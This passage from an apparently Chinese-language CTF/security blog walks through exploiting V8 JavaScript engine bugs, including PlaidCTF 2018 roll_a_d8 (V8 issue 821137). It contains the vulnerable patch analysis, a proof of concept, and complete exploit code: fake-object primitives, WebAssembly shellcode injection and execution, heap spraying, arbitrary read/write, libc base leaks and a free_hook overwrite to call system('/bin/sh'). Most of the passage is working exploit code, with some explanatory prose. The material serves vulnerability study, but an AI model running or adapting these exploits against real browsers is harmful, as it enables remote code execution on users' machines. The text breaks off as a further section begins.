arb_double_arr[0x13a] = double_element_map;</span><br><span class="line">   obj_arr[0] = i2f64(addr + 1n);</span><br><span class="line">   arb_double_arr[0x13a] = obj_element_map;</span><br><span class="line">   var mobj = obj_arr[0];</span><br><span class="line">   return mobj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);</span><br><span class="line">const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule);</span><br><span class="line">var func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];</span><br><span class="line"></span><br><span class="line">var faker_addr = addressOf(faker);</span><br><span class="line">//alert(&#x27;wasm=&#x27;+addressOf(wasmInstance).toString(16));</span><br><span class="line">wasm_shellcode_ptr_addr = addressOf2(wasmInstance) + 0x88n;</span><br><span class="line">var element_addr = faker_addr - 0x50n;</span><br><span class="line">//print(&#x27;element_addr=&#x27; + element_addr.toString(16));</span><br><span class="line">//fake a ArrayBuffer&#x27;s Map</span><br><span class="line">faker[0] = i2f64(0n);</span><br><span class="line">faker[1] = i2f64(0x1900042317080808n);</span><br><span class="line">faker[2] = i2f64(0x00000000082003ffn);</span><br><span class="line">faker[3] = i2f64(0);</span><br><span class="line"></span><br><span class="line">//faker a ArrayBuffer</span><br><span class="line">faker[4] = i2f64(element_addr+0x1n); //map</span><br><span class="line">faker[5] = i2f64(0); //properties</span><br><span class="line">faker[6] = i2f64(0); //elements</span><br><span class="line">faker[7] = p64f(0xffffffff,0); //length</span><br><span class="line">faker[8] = i2f64(wasm_shellcode_ptr_addr);</span><br><span class="line">faker[9] = 0x2;</span><br><span class="line"></span><br><span class="line">var arb_ArrayBuffer = fakeObject(element_addr+0x20n);</span><br><span class="line">var adv = new DataView(arb_ArrayBuffer);</span><br><span class="line">var wasm_shellcode_addr = adv.getBigUint64(0,true);</span><br><span class="line">//alert(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));</span><br><span class="line">faker[8] = i2f64(wasm_shellcode_addr);</span><br><span class="line">//替换wasm的shellcode</span><br><span class="line">for (var i=0;i&lt;shellcode.length;i++) &#123;</span><br><span class="line">   adv.setUint32(i*4,shellcode[i],true);</span><br><span class="line">&#125;</span><br><span class="line">//执行shellcode</span><br><span class="line">func();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="0x03-01-plaidctf2018-roll-a-d8"><a href="#0x03-01-plaidctf2018-roll-a-d8" class="headerlink" title="0x03.01 plaidctf2018-roll_a_d8"></a>0x03.01 plaidctf2018-roll_a_d8</h3><h4 id="patch分析-3"><a href="#patch分析-3" class="headerlink" title="patch分析"></a>patch分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array-gen.cc b/src/builtins/builtins-array-gen.cc</span><br><span class="line">index dcf3be4..3a74342 100644</span><br><span class="line">--- a/src/builtins/builtins-array-gen.cc</span><br><span class="line">+++ b/src/builtins/builtins-array-gen.cc</span><br><span class="line">@@ -1945,10 +1945,13 @@</span><br><span class="line">   void GenerateSetLength(TNode&lt;Context&gt; context, TNode&lt;Object&gt; array,</span><br><span class="line">                          TNode&lt;Number&gt; length) &#123;</span><br><span class="line">     Label fast(this), runtime(this), done(this);</span><br><span class="line">+    // TODO(delphick): We should be able to skip the fast set altogether, if the</span><br><span class="line">+    // length already equals the expected length, which it always is now on the</span><br><span class="line">+    // fast path.</span><br><span class="line">     // Only set the length in this stub if</span><br><span class="line">     // 1) the array has fast elements,</span><br><span class="line">     // 2) the length is writable,</span><br><span class="line">-    // 3) the new length is greater than or equal to the old length.</span><br><span class="line">+    // 3) the new length is equal to the old length.</span><br><span class="line"> </span><br><span class="line">     // 1) Check that the array has fast elements.</span><br><span class="line">     // TODO(delphick): Consider changing this since it does an an unnecessary</span><br><span class="line">@@ -1970,10 +1973,10 @@</span><br><span class="line">       // BranchIfFastJSArray above.</span><br><span class="line">       EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime);</span><br><span class="line"> </span><br><span class="line">-      // 3) If the created array already has a length greater than required,</span><br><span class="line">+      // 3) If the created array&#x27;s length does not match the required length,</span><br><span class="line">       //    then use the runtime to set the property as that will insert holes</span><br><span class="line">-      //    into the excess elements and/or shrink the backing store.</span><br><span class="line">-      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span><br><span class="line">+      //    into excess elements or shrink the backing store as appropriate.</span><br><span class="line">+      GotoIf(SmiNotEqual(length_smi, old_length), &amp;runtime);</span><br><span class="line"> </span><br><span class="line">       StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,</span><br><span class="line">                                      length_smi);</span><br><span class="line">diff --git a/test/mjsunit/regress/regress-821137.js b/test/mjsunit/regress/regress-821137.js</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..639b3b9</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/test/mjsunit/regress/regress-821137.js</span><br><span class="line">@@ -0,0 +1,27 @@</span><br><span class="line">+// Copyright 2018 the V8 project authors. All rights reserved.</span><br><span class="line">+// Use of this source code is governed by a BSD-style license that can be</span><br><span class="line">+// found in the LICENSE file.</span><br><span class="line">+</span><br><span class="line">+// Tests that creating an iterator that shrinks the array populated by</span><br><span class="line">+// Array.from does not lead to out of bounds writes.</span><br><span class="line">+let oobArray = [];</span><br><span class="line">+let maxSize = 1028 * 8;</span><br><span class="line">+Array.from.call(function() &#123; return oobArray &#125;, &#123;[Symbol.iterator] : _ =&gt; (</span><br><span class="line">+  &#123;</span><br><span class="line">+    counter : 0,</span><br><span class="line">+    next() &#123;</span><br><span class="line">+      let result = this.counter++;</span><br><span class="line">+      if (this.counter &gt; maxSize) &#123;</span><br><span class="line">+        oobArray.length = 0;</span><br><span class="line">+        return &#123;done: true&#125;;</span><br><span class="line">+      &#125; else &#123;</span><br><span class="line">+        return &#123;value: result, done: false&#125;;</span><br><span class="line">+      &#125;</span><br><span class="line">+    &#125;</span><br><span class="line">+  &#125;</span><br><span class="line">+) &#125;);</span><br><span class="line">+assertEquals(oobArray.length, maxSize);</span><br><span class="line">+</span><br><span class="line">+// iterator reset the length to 0 just before returning done, so this will crash</span><br><span class="line">+// if the backing store was not resized correctly.</span><br><span class="line">+oobArray[oobArray.length - 1] = 0x41414141;</span><br></pre></td></tr></table></figure>
<p>这题并不是patch引入漏洞，而是patch修复了漏洞，这是一个真实存在于v8中的历史漏洞，并且从patch中可以知道其代号为<code>821137</code>，我们在github上搜索一下代号找到一个commit，点击parent，获得其存在漏洞的那个commit为<code>1dab065bb4025bdd663ba12e2e976c34c3fa6599</code>，于是使用<code>git checkout 1dab065bb4025bdd663ba12e2e976c34c3fa6599</code>，然后编译v8即可。<br>从patch中可以看到，已经有POC了，我们来分析一下POC的原理。<br>首先，漏洞出在<code>GenerateSetLength</code>函数，那么我们查找一下该函数的上层调用，发现其在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// ES #sec-array.from</span><br><span class="line">TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler)</span><br></pre></td></tr></table></figure>
<p>函数中被调用，处<code>bootstrapper.cc</code>中可以知道该函数是<code>Array.from</code>的具体实现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SimpleInstallFunction(array_function, &quot;from&quot;, Builtins::kArrayFrom, 1,</span><br><span class="line">                      false);</span><br></pre></td></tr></table></figure>
<p>该函数的作用是通过一个迭代器为数组元素赋值，用法如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">let arr = [6,6,6,6];</span><br><span class="line">Array.from.call(function() &#123; return arr &#125;, &#123;[Symbol.iterator] : _ =&gt; (</span><br><span class="line">  &#123;</span><br><span class="line">    counter : 0,</span><br><span class="line">    next() &#123;</span><br><span class="line">      let result = this.counter++;</span><br><span class="line">      if (this.counter &gt; 10) &#123;</span><br><span class="line">        return &#123;done: true&#125;;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        return &#123;value: result, done: false&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line">print(arr);</span><br></pre></td></tr></table></figure>
<p>输出如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/plaidctf2018-roll_a_d8/x64.debug# ./d8 poc.js</span><br><span class="line">0,1,2,3,4,5,6,7,8,9</span><br></pre></td></tr></table></figure>
<p>其中<code>[Symbol.iterator]</code>是固定语法，表明这是一个迭代器，我们只需要重写迭代器里的<code>next</code>函数即可实现自己的逻辑。<br>我们先看到<code>TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler)</code>函数中迭代的逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">BIND(&amp;loop);</span><br><span class="line">    &#123;</span><br><span class="line">      // Loop while iterator is not done.</span><br><span class="line">      TNode&lt;Object&gt; next = CAST(iterator_assembler.IteratorStep(</span><br><span class="line">          context, iterator_record, &amp;loop_done, fast_iterator_result_map));</span><br><span class="line">      TVARIABLE(Object, value,</span><br><span class="line">                CAST(iterator_assembler.IteratorValue(</span><br><span class="line">                    context, next, fast_iterator_result_map)));</span><br><span class="line"></span><br><span class="line">      // If a map_function is supplied then call it (using this_arg as</span><br><span class="line">      // receiver), on the value returned from the iterator. Exceptions are</span><br><span class="line">      // caught so the iterator can be closed.</span><br><span class="line">      &#123;</span><br><span class="line">        Label next(this);</span><br><span class="line">        GotoIf(IsUndefined(map_function), &amp;next);</span><br><span class="line"></span><br><span class="line">        CSA_ASSERT(this, IsCallable(map_function));</span><br><span class="line">        Node* v = CallJS(CodeFactory::Call(isolate()), context, map_function,</span><br><span class="line">                         this_arg, value.value(), index.value());</span><br><span class="line">        GotoIfException(v, &amp;on_exception, &amp;var_exception);</span><br><span class="line">        value = CAST(v);</span><br><span class="line">        Goto(&amp;next);</span><br><span class="line">        BIND(&amp;next);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // Store the result in the output object (catching any exceptions so the</span><br><span class="line">      // iterator can be closed).</span><br><span class="line">      Node* define_status =</span><br><span class="line">          CallRuntime(Runtime::kCreateDataProperty, context, array.value(),</span><br><span class="line">                      index.value(), value.value());</span><br><span class="line">      GotoIfException(define_status, &amp;on_exception, &amp;var_exception);</span><br><span class="line"></span><br><span class="line">      index = NumberInc(index.value());</span><br><span class="line"></span><br><span class="line">      // The spec requires that we throw an exception if index reaches 2^53-1,</span><br><span class="line">      // but an empty loop would take &gt;100 days to do this many iterations. To</span><br><span class="line">      // actually run for that long would require an iterator that never set</span><br><span class="line">      // done to true and a target array which somehow never ran out of memory,</span><br><span class="line">      // e.g. a proxy that discarded the values. Ignoring this case just means</span><br><span class="line">      // we would repeatedly call CreateDataProperty with index = 2^53.</span><br><span class="line">      CSA_ASSERT_BRANCH(this, [&amp;](Label* ok, Label* not_ok) &#123;</span><br><span class="line">        BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),</span><br><span class="line">                                           NumberConstant(kMaxSafeInteger), ok,</span><br><span class="line">                                           not_ok);</span><br><span class="line">      &#125;);</span><br><span class="line">      Goto(&amp;loop);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;loop_done);</span><br><span class="line">    &#123;</span><br><span class="line">      length = index;</span><br><span class="line">      Goto(&amp;finished);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到当迭代完成也就是<code>loop_done</code>的时候，将迭代次数<code>index</code>赋值给了<code>length</code>变量，然后最后，调用<code>GenerateSetLength</code>函数将这个length设置到array对象里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// Finally set the length on the output and return it.</span><br><span class="line"> GenerateSetLength(context, array.value(), length.value());</span><br></pre></td></tr></table></figure>
<p>而<code>GenerateSetLength</code>函数将迭代次数与原来的数组长度进行对比，如果比原来的小，就调用js层的<code>SetProperty</code>函数将arr的length设置，否则直接将length值写入。这里看似没有什么问题，但是问题就发生在回调的逻辑里，这里是假设了array对象的length和迭代次数<code>同步的递增</code>，我们可以在迭代回调函数里趁机把array对象的length给改小，然后进入<code>GenerateSetLength(context, array.value(), length.value())</code>函数时就可以绕过<code> GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</code>函数，直接将迭代次数设置为array对象的length。调用<code>SetProperty</code>和使用<code>StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset, length_smi);</code>来设置length的不同之处在于<code>SetProperty</code>是js层的，调用它来设置会顺便将elements扩容或收缩，而<code>StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset, length_smi);</code>函数不回调，直接在内存里写上这个值。因此，不扩容，就造成了溢出。</p>
<h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">let arr = [1.1];</span><br><span class="line">Array.from.call(function() &#123; return arr &#125;, &#123;[Symbol.iterator] : _ =&gt; (</span><br><span class="line">  &#123;</span><br><span class="line">    counter : 0,</span><br><span class="line">    next() &#123;</span><br><span class="line">      let result = this.counter++;</span><br><span class="line">      if (this.counter &gt; 10) &#123;</span><br><span class="line">        arr.length = 1;</span><br><span class="line">        return &#123;done: true&#125;;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        return &#123;value: result, done: false&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line">%DebugPrint(arr);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>可以看到length为10，然而elements的长度值却为1<br><img src="https://p4.ssl.qhimg.com/t01cb0a26697f527b6e.png"><br>由此，我们利用溢出，改写ArrayBuffer的length和backing_store即可实现任意地址读写<br>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">var buf = new ArrayBuffer(0x8);</span><br><span class="line">var dv = new DataView(buf);</span><br><span class="line"></span><br><span class="line">function p64f(value1,value2) &#123;</span><br><span class="line">   dv.setUint32(0,value1,true);</span><br><span class="line">   dv.setUint32(0x4,value2,true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function i2f64(value) &#123;</span><br><span class="line">   dv.setBigUint64(0,BigInt(value),true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64_l(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return dv.getUint32(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64_h(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return dv.getUint32(4,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">let obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">var spray_size = 0x1000;</span><br><span class="line">var arr = new Array(spray_size);</span><br><span class="line"></span><br><span class="line">let oobArray = [];</span><br><span class="line">//转为double array</span><br><span class="line">oobArray[0] = 1.1;</span><br><span class="line">oobArray.length = 0;</span><br><span class="line">let maxSize = 1024*8;</span><br><span class="line"></span><br><span class="line">Array.from.call(function() &#123; return oobArray &#125;, &#123;[Symbol.iterator] : _ =&gt; (</span><br><span class="line">  &#123;</span><br><span class="line">    counter : 0,</span><br><span class="line">    next() &#123;</span><br><span class="line">      let result = this.counter++;</span><br><span class="line">      if (this.counter &gt; maxSize) &#123;</span><br><span class="line">        oobArray.length = 0x1;</span><br><span class="line">        //堆喷</span><br><span class="line">        for (var i=0;i&lt;spray_size;i++) &#123;</span><br><span class="line">           arr[i] = new ArrayBuffer(0x1234);</span><br><span class="line">        &#125;</span><br><span class="line">        return &#123;done: true&#125;;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        return &#123;value: result, done: false&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line"></span><br><span class="line">var backing_store_h = u64_h(oobArray[5]);</span><br><span class="line">var backing_stroe_l = u64_l(oobArray[5]);</span><br><span class="line">print(backing_store_h.toString(16) + backing_stroe_l.toString(16));</span><br><span class="line">//修改ArrayBuffer的byteLength</span><br><span class="line">oobArray[4] = p64f(0,0x666666);</span><br><span class="line"></span><br><span class="line">var oob_buf;</span><br><span class="line">//寻找被成功修改的那个ArrayBuffer</span><br><span class="line">for (var i=0;i&lt;spray_size;i++) &#123;</span><br><span class="line">   if (arr[i].byteLength != 0x1234) &#123;</span><br><span class="line">      oob_buf = arr[i];</span><br><span class="line">      print(&quot;found!!&quot; + arr[i].byteLength);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (oob_buf == null) &#123;</span><br><span class="line">   console.log(&quot;error!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var oob_dv  = new DataView(oob_buf);</span><br><span class="line"></span><br><span class="line">function read64(addr_h,addr_l) &#123;</span><br><span class="line">   oobArray[5] = p64f(addr_l,addr_h);</span><br><span class="line">   return oob_dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function write64(addr_h,addr_l,value) &#123;</span><br><span class="line">   oobArray[5] = p64f(addr_l,addr_h);</span><br><span class="line">   oob_dv.setFloat64(0,value,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var d = read64(backing_store_h,backing_stroe_l + 0x1820);</span><br><span class="line">var elf_base_h = u64_h(d);</span><br><span class="line">var elf_base_l = u64_l(d) - 0xb83338;</span><br><span class="line"></span><br><span class="line">d = read64(elf_base_h,elf_base_l + 0xB9A118);</span><br><span class="line">var libc_base_h = u64_h(d);</span><br><span class="line">var libc_base_l = u64_l(d) - 0x21ab0;</span><br><span class="line">var system_l = libc_base_l + 0x4f4e0;</span><br><span class="line">var free_hook_l = libc_base_l + 0x3ed8e8;</span><br><span class="line">console.log(&quot;[+]libc_base=&quot; + libc_base_h.toString(16) + libc_base_l.toString(16));</span><br><span class="line">console.log(&quot;[+]system=&quot; + libc_base_h.toString(16) + system_l.toString(16));</span><br><span class="line">console.log(&quot;[+]free_hook=&quot; + libc_base_h.toString(16) + free_hook_l.toString(16));</span><br><span class="line">//需要执行的命令</span><br><span class="line">var shell_buf = new ArrayBuffer(0x30);</span><br><span class="line">var str = &quot;/bin/sh\x00&quot;;</span><br><span class="line">var bufView = new Uint8Array(shell_buf);</span><br><span class="line">for (var i=0, strLen=str.length; i&lt;strLen; i++) &#123;</span><br><span class="line">   bufView[i] = str.charCodeAt(i);</span><br><span class="line">&#125;</span><br><span class="line">//写free_hook</span><br><span class="line">write64(libc_base_h,free_hook_l,p64f(system_l,libc_base_h));</span><br></pre></td></tr></table></figure>
<h3 id="0x03-02-issue-716044"><a href="#0x03-02-issue-716044" class="headerlink" title="0x03.02 issue 716044"></a>0x03.02 issue 716044</h3><h4 id="patch分析-4"><a href="#patch分析-4" class="headerlink" title="patch分析"></a>patch分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span 